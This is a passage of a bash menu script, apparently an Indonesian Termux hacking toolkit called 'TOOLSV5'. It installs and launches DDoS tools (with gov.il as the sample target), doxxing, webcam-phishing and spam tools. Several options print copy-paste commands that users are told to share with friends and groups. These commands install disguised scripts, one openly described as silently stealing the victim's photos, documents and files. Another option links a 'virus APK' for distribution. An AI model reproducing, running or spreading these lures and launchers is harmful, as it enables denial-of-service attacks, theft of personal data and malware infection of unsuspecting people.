play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $k "installasi package...❗"
nala install nodejs-lts
cd $HOME
git clone --depth 1 https://github.com/Yadav210012/Temp-Mail
fi
done
ENTER
elif [ "$no" = "34" ]; then
$e $k "Installasi bahan"
nala install imagemagick git nodejs ffmpeg yarn -y
clear
cowsay -f eyes "GALIRUS PROJECTS" | lolcat
$e
$e "===============================================" | lolcat
$e $k " 1$m.$h INSTALLASI BOT DULU "
$e $k " 2$m.$h JALANKAN BOT 24 JAM\n     ( KALAU NO 1 SUDAH PERNAH DI INSTALL )"
$e $k " 3$m $h EXIT"
$e "===============================================" | lolcat
$e
$e $b "╭─────────[$m root㉿localhost$b ]$b"
read -p ' ╰─────────▶ ' no
if [ $no = "1" ]; then
$e $m "====>$k LANGKAH-LANGKAH$m <====\n yang harus kalian paham i dulu"
$e $k " 1.download dulu bot yang nanti saya arahkan ke browser$m !"
$e $k " 2.jika sudah silahkan enter untuk melanjutkan"
$e $k "   Sisannya akan saya coba untuk\n    mendeteksi botnya dan menjalankannya$m !"
$e
$e $m
read -p " ENTER untuk mendownload botnya "
$e $k " Proses membuka browser"
$s 1
xdg-open "https://www.mediafire.com/file/xnxzxpxmx30w33e/bot.zip/file"
clear
$e $bl " TUNGGU SAMPAI DOWNLOAD BOTNYA SELESAI "
$s 20
$e $m " JANGAN PENCET APA PUN KALO DOWNLOAD BOT BELUM SELESAI"
$s 3
$e $m " KALAU MELANGGAR & ERROR BUKAN SALAH SAYA ! "
$s 3
$e $bl " JIKA BOT SUDAH SELESAI DI DOWNLOAD"
$s 2
$e $bl " BARU ANDA BERHAK ENTER YA "
$e
$e $m
read -p " Jika file sudah benar selesai download silahkan ENTER"
clear
$e $m
read -p " ENTER untuk izinkan termux ke SDCARD"
termux-setup-storage
$e $m
read -p " ENTER untuk ekstrak bot & menjalankannya !"
clear
$e $h " LOADING EKSTRAK BOT"
cd /sdcard/Download/
unzip bot.zip
$e
$e
$e
$e
$e $h " BOT BERHASIL DI EKSTRAK"
$s 1
$e $m
read -p "ENTER untuk menjalankan BOT"
clear
cd /sdcard/Download/galirus
npm start
elif [ $no = "2" ]; then
$e $k "Menjalankan BOT"
ulang="y"
while [ $ulang ]; do
cd /sdcard/Download/galirus
npm start
done
elif [ "$no" = "3" ]; then
exit
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "INPUTE SALAH ANJENG"
fi
ENTER
elif [ "$no" = "35" ]; then
while true; do
karma="/sdcard/KARMA-DDoS"
if [ -d "$karma" ]; then
cd $karma
git pull
clear
python3 setup.py
python3 main.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd /sdcard
git clone --depth 32 https://github.com/HyukIsBack/KARMA-DDoS
cd KARMA-DDoS
pip3 install -r requirements.txt
fi
done
ENTER
elif [ "$no" = "36" ]; then
while true; do
doxxer="$HOME/Doxxer-Toolkit"
if [ -d "$doxxer" ]; then
cd $doxxer
python3 dox.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
git clone --depth 32 https://github.com/Euronymou5/Doxxer-Toolkit
cd Doxxer-Toolkit
pip install Faker pypng requests pyshorteners pyqrcode phonenumbers socialscan google
git pull origin main
git stash
fi
done
ENTER
elif [ "$no" = "37" ]; then
clear
while true; do
tampilantermux="/sdcard/T4MPILAN-V5"
if [ -d "$tampilantermux" ]; then
cd $tampilantermux
python2 style5.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd /sdcard
apt update
apt upgrade
nala install python2 -y
nala install git -y
git clone --depth 32 https://github.com/h20-studio/T4MPILAN-V5
cd T4MPILAN-V5
fi
done
ENTER
elif [ "$no" = "38" ]; then
if [ -f "$idtermux" ]; then
valid_ids="$idtermux"
termux_id=$(whoami)
if [[ $(grep -c "$termux_id" $valid_ids) -eq 1 ]]; then
clear
$e $k "Penguna$h VIP UNLOCK"
sleep 5
clear
clear
figlet "Unban" | lolcat
echo "By.Galirus"
echo
read -p "Nomor => : " isi
clear
read -p "Isi ( 1 - 5 ) : " ap
if [ $ap = "1" ]; then
xdg-open "mailto:support@whatsapp.com?subject=Subjek%20Pesan&body= Kepada Developer Whatsapp yang terhormat Saya mau mengajukan Permohonan tolong buka akun whatsapp saya yang terkena ban di karena kan keisengan atas orang lain, tolong pertimbangkan lagi akun saya di karenakan banyak nya dokumentasi penting Yang belum saya Cadangkan Jadi saya mohon pertimbangkan lagi akun saya ini nomor : $isi"
elif [ $ap = "2" ]; then
xdg-open "mailto:support@whatsapp.com?subject=Subjek%20Pesan&body=Kepada Tim WhatsApp,Saya ingin mengajukan permohonan untuk melakukan unban akun WhatsApp yang terhubung dengan alamat email saya. Saya mohon maaf atas kesalahan yang telah saya lakukan dan saya siap untuk mematuhi aturan dan kebijakan yang berlaku. Saya sangat mengandalkan WhatsApp untuk komunikasi sehari-hari dan saya berharap dapat menggunakan layanan tersebut kembali nomor saya : $isi Terima kasih atas perhatian dan pertimbangan anda"
elif [ $ap = "3" ]; then
xdg-open "mailto:support@whatsapp.com?subject=Subjek%20Pesan&body=Al equipo de WhatsApp, me gustaría enviar una solicitud para que se pueda reactivar mi cuenta prohibida de WhatsApp.  Entiendo que esto ha violado la política de WhatsApp y pido disculpas por los errores que he cometido.  Confío en gran medida en WhatsApp para comunicarme con amigos, familiares y colegas.  Prometo cumplir con todas las reglas y políticas aplicables en WhatsApp para que esto no vuelva a suceder.  Espero que el equipo de WhatsApp pueda considerar mi solicitud y darme una segunda oportunidad de utilizar los servicios de WhatsApp.  Gracias por su atención y cooperación.  mi número : $isi"
elif [ $ap = "4" ]; then
xdg-open "mailto:support@whatsapp.com?subject=Subjek%20Pesan&body=Kepada Admin WhatsApp, Saya ingin mengajukan permohonan untuk dapat di-unban dari WhatsApp dikarenakan saya disangka melakukan spam dari akun Gmail saya. Saya memberikan jaminan bahwa saya tidak melakukan tindakan spam dan berkomitmen untuk menggunakan WhatsApp sesuai dengan ketentuan yang berlaku. Saya mohon agar akun saya dapat diaktifkan kembali sehingga saya dapat kembali menggunakan layanan WhatsApp dengan baik. Terima kasih atas perhatian dan kerja sama yang diberikan. nomor saya : $isi"
elif [ $ap = "5" ]; then
xdg-open "mailto:support@whatsapp.com?subject=Subjek%20Pesan&body=Yth. Tim WhatsApp, Saya ingin menyampaikan permohonan agar akun WhatsApp saya yang diblokir karena dituduh sebagai spam dari Gmail dapat dibuka kembali. Saya memastikan bahwa saya tidak melakukan tindakan spam dan berjanji untuk mematuhi aturan dan kebijakan yang berlaku di WhatsApp. Saya sangat bergantung pada WhatsApp untuk berkomunikasi dengan teman, keluarga, dan rekan kerja, sehingga saya berharap agar ban WhatsApp saya segera dicabut. Terima kasih atas perhatian dan kerja samanya dalam mempertimbangkan permohonan saya. nomor saya : $isi"
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
echo " pilihan salah"
fi
read -p "Anda Sudah Mengirim Pesan"
read -p "ENTER UNTUK MENGULANGI TOOLSV5" galirus
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
$e $m "Anda Bukan Penguna VIP"
sleep 5
clear
fi
fi
elif [ "$no" = "39" ]; then
while true; do
folder_path="$HOME/okadminfinder3"
if [ -d "$folder_path" ]; then
echo "Folder already exists, running the commands..."
cd "$folder_path" || exit
sleep 3
clear
python3 okadminfinder.py
echo
echo
echo
echo "contoh : https://gov.il"
read -p "URL ===> : " mana
python3 okadminfinder.py -u $mana
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
echo "Cloning the repository and installing requirements..."
cd "$HOME" || exit
git clone --depth 32 https://github.com/mIcHyAmRaNe/okadminfinder3.git
cd okadminfinder3 || exit
pip3 install -r requirements.txt
fi
ENTER
done
elif [ "$no" = "40" ]; then
while true; do
pandora="$HOME/pandora"
if [ -d "$pandora" ]; then
$e $h "Menjalankan SCRIPT"
sleep 3
cd $pandora
python3 pandora.py
break
else
cd $HOME
apt update && apt upgrade && pkg update && pkg upgrade && nala install curl wget python3 git figlet && git clone --depth 32 https://github.com/MrSanZz/pandora && cd pandora && pip3 install -r requirements.txt && python3 setup.py
fi
done
ENTER
elif [ "$no" = "41" ]; then
cd $galirusfile
clear
python3 saqahayang.py
ENTER
elif [ "$no" = "42" ]; then
clear
$e $m " ANDA MEMILIH UNTUK MENGGUNAKAN VIRUS FILE BY.GALIRUS OFFICIAL$p"
play -q $HOME/TOOLSV5/sound/njirvirus.mp3 &> /dev/null &
text="Virus file berbasis script Yaitu adalah virus yang menyerang penyimpanan internal dengan menggunakan file, jumlah file yang terkirim unlimited,virus file ini bisa berkerja di latar belakang tanpa sepengetahuan target/penguna, jadi penguna/target pandangan nya akan teralihkan ke script yang bisa di bilang umpan !"
delay=0.05 # penundaan antara setiap karakter (detik)
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
$e $m
read -p "ENTER UNTUK MELANJUTKAN"
clear
cd $HOME/TOOLSV5
play -q $HOME/TOOLSV5/sound/virus.mp3 &> /dev/null &
sleep 15
play -q $HOME/TOOLSV5/sound/virus2.mp3 &> /dev/null &
$e $m "SILAHKAN SALIN COMMAND DI BAWAH INI, SILAHKAN BAGIKAN KE TEMAN,GROUP,KONTAK,STATUS$p"
echo
$e "pkg update && pkg upgrade"
$e "nala install git bash"
$e "git clone --depth 32 https://github.com/Galirus404/HACKGG"
$e "cd HACKGG"
$e "bash gas.sh"
$e $k
ENTER
elif [ "$no" = "43" ]; then
clear
$e $p " ANDA MEMILIH UNTUK MENDOWNLOAD VIRUS APK"
$e $h " Harap jangan di pasang di hp anda sendiri, itu namanya tolol !"
$e $h " Kalo Masih Mau Coba sendiri Sediakan Saja Virtual Android Dan Install Di Dalamnya"
$e $h " Silahkan Bagikan ke ,GROUP,KONTAK,SW ( KALO BISA ) "
$e $m
read -p " ENTER UNTUK MELANJUTKAN"
sleep 2
clear
$e " MEMBUKA BROWSER"
xdg-open "https://sfile.mobi/7hLVjW0q0EU"
elif [ "$no" = "44" ]; then
while true; do
camhack2="/sdcard/CamPhish"
if [ -d "$camhack2" ]; then
cd $camhack2
bash camphish.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
apt-get -y install php openssh git wget
cd /sdcard
git clone --depth 32 https://github.com/techchipnet/CamPhish
cd CamPhish
fi
done
ENTER
elif [ "$no" = "45" ]; then
installosint() {
cd /data/data/com.termux/files/usr/include/
git clone --depth 32 https://github.com/zerotermux/OsintG404
cd OsintG404
git pull origin main
git stash
}
while true; do
camera="/data/data/com.termux/files/usr/include/OsintG404"
if [ -d "$camera" ]; then
cd $camera
bash gas.sh
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
installosint &> /dev/null | $e $bg_m "Sabar Installasi Cog"$res
fi
done
ENTER
elif [ "$no" = "46" ]; then
while true; do
overload="$HOME/overload"
if [ -d "$overload" ]; then
cd $overload
clear
python3 overload.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
nala install python3 python3-pip git -y
cd $HOME
git clone --depth 32 https://github.com/7zx/overload
cd overload
pip install -r requirements.txt
fi
done
ENTER
elif [ "$no" = "47" ]; then
while true; do
osintx="$HOME/osint-X"
if [ -d "$osintx" ]; then
cd $osintx
python osint-X.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
pkg update -y && pkg upgrade -y
nala install python -y
nala install git
git clone --depth 32 https://github.com/Whomrx666/osint-X.git
cd osint-X
bash module.sh
fi
done
ENTER
elif [ "$no" = "48" ]; then
clear
cd $HOME/TOOLSV5
play -q $HOME/TOOLSV5/sound/virus.mp3 &> /dev/null &
sleep 15
play -q $HOME/TOOLSV5/sound/virus2.mp3 &> /dev/null &
$e $m "SILAHKAN SALIN COMMAND DI BAWAH INI, SILAHKAN BAGIKAN KE TEMAN,GROUP,KONTAK,STATUS$p"
echo
$e "pkg update && pkg upgrade"
$e "nala install git bash sox -y"
$e "git clone --depth 32 https://github.com/Galirus404/spam"
$e "cd spam"
$e "bash spam.sh"
$e $k
ENTER
elif [ "$no" = "49" ]; then
while true; do
jarvis="$HOME/JARVIS"
if [ -d "$jarvis" ]; then
cd $jarvis
python jarvis.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
pkg update && pkg upgrade
nala install git bash sox -y
cd $HOME
git clone --depth 32 https://github.com/Galirus404/JARVIS
cd JARVIS
fi
done
ENTER
elif [ "$no" = "50" ]; then
while true; do
xattack="$HOME/GhostTrack"
if [ -d "$xattack" ]; then
echo " Running Script"
sleep 3
cd $xattack
pip3 install -r requirements.txt
python3 GhostTR.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
nala install git
nala install python3
git clone --depth 32 https://github.com/HunxByts/GhostTrack
fi
done
ENTER
elif [ "$no" = "51" ]; then
file="/storage/emulated/0/DCIM/Cloud.go"
if [ -f "$file" ]; then
cd /storage/emulated/0/DCIM/
clear
figlet "DDOS" | lolcat
echo
$e $k "Klik$m CTRL C$k untuk MENGENTIKAN DDOS"
echo
echo "Masukkan URL contoh : https://gov.il/"
read -p "URL   ===> : " ip
read -p "PORT  ===> : " port
read -p "DETIK ===> : " DETIK
go run Cloud.go -url $ip $port $DETIK
read -p "ENTER UNTUK MENGGULANGI TOOLSV5"
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
clear
nala install golang -y
termux-setup-storage
clear
$e $h
read -p "ENTER UNTUK DOWNLOAD FILENYA"
xdg-open "https://www.mediafire.com/file/94fxgcox0yvqf3y/file.zip/file"
clear
read -p "ENTER JIKA FILE YANG DI DOWNLOAD SUDAH SELESAI"
clear
$e $h "Scanning File Harap Di Tunggu...!$k"
sleep 3
cd /storage/emulated/0/Download/
unzip file.zip -d /storage/emulated/0/DCIM/ &> /dev/null
rm -rf file.zip
clear
$e $h "Scanning Selesai !$m"
sleep 3
clear
read -p "ENTER UNTUK RUN DDOS"
cd /storage/emulated/0/DCIM/
clear
$e $h "SUCCES$k !$m Script Siap Di Gunakan$k !$m Silahkan Ulangi DARI TOOLSV5$h"
read -p "ENTER UNTUK MENGGULANG KE TOOLSV5"
fi
elif [ "$no" = "52" ]; then
while true; do
camhack3="$HOME/Cam-Hackers"
if [ -d "$camhack3" ]; then
cd $camhack3
python3 cam-hackers.py
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
git clone --depth 32 https://github.com/AngelSecurityTeam/Cam-Hackers
cd Cam-Hackers
pip3 install -r requirements.txt
fi
done
read -p "ENTER UNTUK MENGULANG KE TOOLSV5"
elif [ "$no" = "53" ]; then
while true; do
pindai="$HOME/okadminfinder3"
if [ -d "$pindai" ]; then
cd $pindai
read -p "Masukkan URL : " web
python okadminfinder.py -u $web
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
cd $HOME
git clone --depth 32 https://github.com/mIcHyAmRaNe/okadminfinder3.git
cd okadminfinder3
chmod +x okadminfinder.py
./okadminfinder.py -h
fi
done
elif [ "$no" = "54" ]; then
while true; do
dos="$letakgalirus/poc/node_modules"
if [ -d "$dos" ]; then
clear
$e $h "Berhasil Install Package ❗ Membuka ❗"
sleep 3
clear
cd $letakgalirus/poc/
node TLS-SILIT.js
read -p "URL : " link
read -p "TIME : " time
read -p "RATE : " rate
read -p "THREAD : " thread
clear
$e $k "Catatan Masukkan Anda ( $link $time $rate $thread )"
node TLS-SILIT.js $link $time $rate $ thread proxy.txt
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
nala install nodejs
$e $m "package Belum Ada ❗ Menginstall ❗"
cd $letakgalirus/poc/ &> /dev/null
unzip node_modules.zip -d node_modules
fi
done
read -p "ENTER UNTUK MENGULANG KE TOOLSV5"
elif [ "$no" = "55" ]; then
while true; do
whoiss="/data/data/com.termux/files/usr/bin/whois"
if [ -f "$whoiss" ]; then
clear
figlet "Whois" | lolcat
read -p "Masukkan URL : " domain
whois $domain
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $h "Package Belum Terinstall"
nala install whois -y
fi
done
read -p "ENTER UNTUK MENGULANG KE TOOLSV5"
elif [ "$no" = "56" ]; then
while true; do
redhawk="$HOME/RED_HAWK"
if [ -d "$redhawk" ]; then
$e $h "Anda Sudah Menginstall...❗"
sleep 3
clear
cd $redhawk
php rhawk.php
break
else
play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null &
$e $m "Installasi Package...❗"
nala install php nmap -y
cd $HOME
git clone --depth 1 https://github.com/Tuhinshubhra/RED_HAWK
fi
done
read -p "ENTER UNTUK MENGULANG KE TOOLSV5"
elif [ "$no" = "57" ]; then
bannershiroko() {
echo "⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣴⣿⣿⣿⣿⡿⠁⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣿⣿⣿⣿⣿⠁⠀⠀⠀⢨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠋⠉⠉⠙⠛⠿⠟⠻⠿⠿⠿⠿⠷⣤⣀⠀⠀⢀⠴⠟⠛⠛⠛⠋⠉⠁⠉⠁⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⣄⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣧⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣿⣿⣸⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⢸⣿⣦⣦⣄⡀⠀⢠⣶⢰⣦⣶⣰⣆⣶⣰⣦⣄⢰⣴⡄⣴⠀⠀⣦⣷⣿⣿⣿⣿⣯⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⡿⣿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⡿⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢹⠘⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⠹⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠟⠏⢿⢿⢿⢧⠘⣿⢿⣿⡟⠿⡇⠸⣿⠿⢻⡟⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠈⠈⠁⠀⠃⠀⠀⠀⠀⠃⠀"
}
clear
$e $h
text="      SHIROKO TOOLS GALERI EYES $versitoolsv5"
delay=0.05 # penundaan antara setiap karakter (deti>
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
sleep 5
while true; do
clear
bannershiroko | lolcat
$e $bg_m "1.SCRIPT PAYLOADNYA PHISING SCRIPT ( SHIROKO )$res"
$e $bg_m "2.HASIL PANCINGAN KUNJUNG I TELEGRAM$res"
$e $bg_m "3.BACK TO TOOLSV5$res"
read -p "Silahkan Pilih : " mana
if [ "$mana" = "1" ]; then
clear
bannerteks() {
echo "
Script Ilegal yang Digunakan untuk Mengambil Data Pribadi Target
Jenis data yang diambil:
- FOTO
- TXT
- PDF
- ZIP
- SCRIPT BASH
- SCRIPT PYTHON
Anda bisa memancing target untuk menggunakan command di bawah ini dan membujuk target untuk menggunakannya:
Command:
pkg install git bash curl -y
git clone --depth 32 https://github.com/Galirus404/DDOS
cd DDOS
chmod 777 DDOS
./DDOS
Harap diperhatikan bahwa penggunaan script ilegal dapat melanggar hukum dan etika."
}
bannershiroko | lolcat
sleep 3
bannerteks | lolcat
echo
$e $b
read -p "ENTER UNTUK MENGULANG KE MENU"
elif [ "$mana" = "2" ]; then
xdg-open "https://t.me/Galery_Eyes"
elif [ "$mana" = "3" ]; then
break
fi
done
elif [ "$no" = "58" ]; then
while true; do
zxcddos="$HOME/ZxCDDoS"
if [ -d "$zxcddos" ]; then
cd $zxcddos
python3 c2.py
break
else
cd $HOME
nala install git -y
nala install golang -y
nala install perl -y
nala install python -y
nala install python2 -y
nala install python-pip -y
nala install nodejs -y
git clone --depth 32 https://github.com/hoaan1995/ZxCDDoS/
cd ZxCDDoS/
npm install requests https-proxy-agent crypto-random-string events fs net cloudscraper request hcaptcha-solver randomstring cluster cloudflare-bypasser http http2 crypto tls
pip install -r requirements.txt
nala install w3m -y
ulimit -n 999999
chmod 777 *
ENTER
fi
done
elif [ "$no" = "59" ]; then
while true; do
panglimajatim="/data/data/com.termux/files/usr/Downloadmusic"
if [ -d "$panglimajatim" ]; then
cd "$panglimajatim"
python Audio1.py
break
else
clear
play -q "$HOME/TOOLSV5/sound/salah.mp3" &> /dev/null &
echo -e "\033[1;32mSabar, Installasi Package\033[0m"
nala install -y python python2 figlet toilet mpv git
pip install mpv
cd /data/data/com.termux/files/usr
git clone https://github.com/Projeckerror/Downloadmusic
fi
done
elif [ "$no" = "60" ]; then
check_shfmt() {
if ! command -v shfmt &> /dev/null; then
echo "shfmt not found, installing..."
nala update
nala install shfmt -y &> /dev/null | echo "Bentar Brek Instalasi Package Sabar Ya"
fi
}
while true; do
check_shfmt
clear
play -q "$HOME/TOOLSV5/sound/robot.mp3" &> /dev/null &
$banner | lolcat
$e $b
sleep 3
play -q "$HOME/TOOLSV5/sound/robot2.mp3" &> /dev/null &
$e " Masukkan jalur dan nama script yang ingin Ditata\n Contohnya :$bg_h /sdcard/nama_file_mu$res"
sleep 3
$e $m
play -q "$HOME/TOOLSV5/sound/klik.mp3" &> /dev/null &
read -p " Silahkan Masukkan Jalur Dan Nama Script : " jalurdanscript
play -q "$HOME/TOOLSV5/sound/klik.mp3" &> /dev/null &
read -p " Berapa Baris ? Default ( 5 ) : " baris
play -q "$HOME/TOOLSV5/sound/klik.mp3" &> /dev/null &
$e $k
clear
if [ -f "$jalurdanscript" ]; then
text=" Galirus Sedang Menformat skrip Anda Di Jalur : $jalurdanscript "
delay=0.05
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
$e $h
play -q "$HOME/TOOLSV5/sound/loading.mp3" &> /dev/null &
sleep 2
function show_loading() {
local i=0
while [ $i -le 100 ]; do
printf '\r%s' " ==> Proses [ $i ]"
sleep 0.05
((i++))
done
}
show_loading &
sleep 8
shfmt -w -i $baris -ci -sr "$jalurdanscript"
kill $! &> /dev/null &
$e $k
clear
play -q "$HOME/TOOLSV5/sound/klik.mp3" &> /dev/null &
text="Skrip telah diformat Jalur Hasil : $jalurdanscript"
delay=0.05
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
sleep 2
else
clear
play -q "$HOME/TOOLSV5/sound/salah.mp3" &> /dev/null &
$e $bg_m " File $jalurdanscript tidak ditemukan$res"
sleep 5
fi
$e $h
play -q "$HOME/TOOLSV5/sound/klik.mp3" &> /dev/null &
read -p "Apakah Anda ingin mengulangi proses? (y/n): " galirus
play -q "$HOME/TOOLSV5/sound/klik.mp3" &> /dev/null &
if [[ "$galirus" != "y" ]]; then
break
fi
done
fi
fi
if [ "$no" = "botz" ]; then
isipesan="Terdeteksi Masuk Ke BOTZ ! 👨‍💻"
kirimpesan &> /dev/null
TAMPILANTOOLSV5
BOTZ
READ
if [ "$no" = "bot1" ]; then
while true; do
oreobot="$HOME/botmulti"
